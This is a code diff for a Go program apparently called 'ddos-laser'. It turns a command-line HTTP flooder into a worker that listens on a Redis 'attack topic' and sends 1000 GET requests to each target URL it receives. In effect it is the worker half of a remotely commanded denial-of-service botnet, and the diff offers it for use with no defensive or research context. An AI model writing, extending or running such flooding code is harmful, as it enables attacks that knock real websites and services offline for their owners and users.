@@ -1,14 +1,13 @@
 package main
 
 import (
-	"flag"
 	"io/ioutil"
+	"log"
 	"net/http"
-	"os"
-	"os/signal"
-	"syscall"
 
-	log "github.com/sirupsen/logrus"
+	"github.com/go-redis/redis"
+	"github.com/michaeloverton/ddos-laser/internal/env"
+	"github.com/sirupsen/logrus"
 )
 
 // Temporary constant till we solve the error:
@@ -19,77 +18,71 @@ import (
 const maxRequests = 100
 
 func main() {
-	// Parse URL from command line.
-	var URL string
-	flag.StringVar(&URL, "url", "", "target url")
-	// Parse number of requests from command line.
-	var count int
-	flag.IntVar(&count, "count", 10, "number of requests")
-
-	flag.Parse()
-
-	if URL == "" {
-		log.Fatal("target required")
+	// Load the laser environment.
+	env, err := env.LoadLaserEnv()
+	if err != nil {
+		log.Fatal("error loading environment: ", err.Error())
 	}
 
-	log.Info("firing laser at: ", URL)
+	// Set up http client.
+	httpClient := http.Client{}
 
-	var client http.Client
+	// Set up subscription client.
+	subClient := redis.NewClient(&redis.Options{
+		Addr:     env.RedisAddress,
+		Password: "", // no password set
+		DB:       0,  // use default DB
+	})
 
-	// Set up quit channel.
-	quit := make(chan bool)
+	// Test connection to client.
+	_, err = subClient.Ping().Result()
+	if err != nil {
+		log.Fatal("failed to connect to redis", err)
+	}
 
-	// Fire a goroutine that waits for OS signals. Upon receiving signal, quit channel will receive.
-	// This will allow the program to terminate.
-	go func(quit chan bool) {
-		signals := make(chan os.Signal)
-		defer close(signals)
+	// Subscribe to the attack topic.
+	sub := subClient.Subscribe("topic")
+	subChan := sub.Channel()
 
-		signal.Notify(signals, syscall.SIGQUIT, syscall.SIGTERM, os.Interrupt)
-		defer signal.Stop(signals)
-
-		signal := <-signals
-		log.Infof("signal received: %s \n", signal.String())
-		quit <- true
-	}(quit)
-
-	// Make requests until we receive a stop signal.
-	conns := 0
+	// When a message is received, attack target.
 	for {
 		select {
-		case <-quit:
-			log.Info("quitting by command")
-			return
-		default:
-			if conns < maxRequests {
-				conns++
-				go makeRequest(client, URL)
-			}
+		case m := <-subChan:
+			logrus.Info(m.Payload)
+			// logrus.Info(m.Pattern)
+			// logrus.Info(m.Channel)
+			makeRequest(httpClient, m.Payload)
 		}
 	}
 }
 
 func makeRequest(c http.Client, URL string) {
-	// Create the request to the target.
-	req, err := http.NewRequest("GET", URL, nil)
-	if err != nil {
-		log.Fatalf("failed to create request: %s", err)
+	// Make 1000 requests
+	for i := 0; i < 1000; i++ {
+		logrus.Infof("making request to: %s", URL)
+
+		// Create the request to the target.
+		req, err := http.NewRequest("GET", URL, nil)
+		if err != nil {
+			logrus.Errorf("failed to create request: %s", err)
+		}
+
+		// Make the request.
+		res, err := c.Do(req)
+		if err != nil {
+			logrus.Errorf("request failed: %s", err)
+		}
+		defer res.Body.Close()
+
+		// Decode the body for now.
+		body, err := ioutil.ReadAll(res.Body)
+		if err != nil {
+			logrus.Fatal(err)
+		}
+
+		// Log body.
+		logrus.Info("response code:", res.StatusCode)
+		logrus.Info(string(body))
 	}
 
-	// Make the request.
-	res, err := c.Do(req)
-	if err != nil {
-		log.Fatalf("request failed: %s", err)
-	}
-	defer res.Body.Close()
-
-	// Decode the body for now.
-	body, err := ioutil.ReadAll(res.Body)
-	if err != nil {
-		log.Fatal(err)
-	}
-
-	// Log body.
-	log.Info("response code:", res.StatusCode)
-	log.Info(string(body))
 }
